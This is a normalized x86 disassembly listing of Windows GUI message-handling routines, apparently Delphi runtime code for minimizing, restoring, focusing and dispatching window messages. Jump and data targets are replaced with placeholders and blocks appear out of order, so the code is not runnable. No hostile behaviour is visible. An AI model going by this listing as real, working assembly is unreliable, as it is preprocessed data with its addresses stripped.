mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45834c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4582f0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_43f228
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_457e14
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_456bc8
push ebp
call sub_457688
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_457688
pop ecx
jmp [ eax * 4 + jump_table_4577b4 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_43f228
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4581c8
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_443ba0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45761c
push ebp
call sub_457688
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_457688
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_457688
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_418fac
jmp r-xdata
xor eax eax
call sub_44f540
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_43f228
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_439bf4
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_457e30
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_457688
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_454dc8
jmp r-xdata
push ebp
call sub_457688
pop ecx
jmp r-xdata
push ebp
call sub_4576c4
pop ecx
jmp r-xdata
push ebp
call sub_457688
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_457528
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_457ee0
jmp r-xdata
jmp r-xdata
call sub_429004
call sub_4290e4
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_457518
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_457528
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_457520
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f3f0
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_457688
pop ecx
jmp r-xdata
call sub_44f4a4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_457688
pop ecx
jmp r-xdata
call sub_429004
call sub_429140
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40cc30
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_457e30
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_457518
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_456e48
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_43f228
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_43f228
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_457ee0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_456e48
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_43f228
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_457528
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_43f228
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_452b54
mov eax [ ebx + 0x44 ]
call sub_454f70
sub_457fe0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_45801c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403fe4
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404080
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_458068
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_45808c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_4580dc
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_435920
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_43f228
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_458194
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_4590f4
sub_4581c8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_43f228
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403454
test al al
jne r-xdata
sub_458234
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_458194
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45808c
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_4580dc
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_458068
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_4582cc
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_458234
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_458b9c
sub_4582f0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_41378c
mov eax 0x8
call sub_4026bc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_413650
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_45834c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4137ac
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026dc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_41369c
jmp r-xdata
sub_4583e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_4036e0#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_43f204
mov [ esi + 0x44 ] edi
sub_458460
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_45853e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_44f368
call sub_407a34
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458545
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_452b54
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_4036e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4582cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_451a5c
mov eax [ ebp - 0x4 ]
call sub_457e30
jmp r-xdata
sub_458560
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40274c
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40276c
push eax
call sub_40274c
pop edx
call sub_40b1bc
call sub_40274c
mov edx [ rw-data ]
call sub_4033e4
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40274c
mov edx eax
mov eax ebx
call sub_458758
pop esi
pop ebx
retn
call sub_40274c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_4585f0
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_44f3f0
mov [ ebp - 0x10 ] eax
call sub_44f30c
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_457594
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_458745
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45874c
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_44f4a4
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_44f314
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_458758
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_458813
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404028
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_45801c
mov eax [ ebp - 0x108 ]
call sub_404450
push eax
mov eax [ ebp - 0x4 ]
call sub_404450
mov edx eax
mov eax ebx
pop ecx
call sub_4585f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45881a
lea eax [ ebp - 0x108 ]
call sub_403f90
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
call sub_4081d4
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402d58
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402b70
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404258
sub_458830
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_43f3c4
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_43f52c
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_458ed4
test al al
je r-xdata
call sub_43f228
mov ebp eax
mov eax edi
call sub_43f228
mov ebp eax
mov eax esi
call sub_458ed4
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_458998
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4589f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_458ed4
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_459720
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4589f7
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_458a00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_458a58
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_458ed4
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_459720
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458a5f
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_458a70
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403258
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_438be0
jmp r-xdata
sub_458ac0
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_45606c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_43f228
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_456058
mov ebx eax
mov eax ebx
call sub_43f52c
test al al
je r-xdata
mov eax ebx
call sub_43f228
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_458b24
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_4372ec
mov edi eax
call sub_435be8
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_439bf4
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_439bf4
sub_458b9c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_458cac
push [ fs : eax ]
mov [ fs : eax ] esp
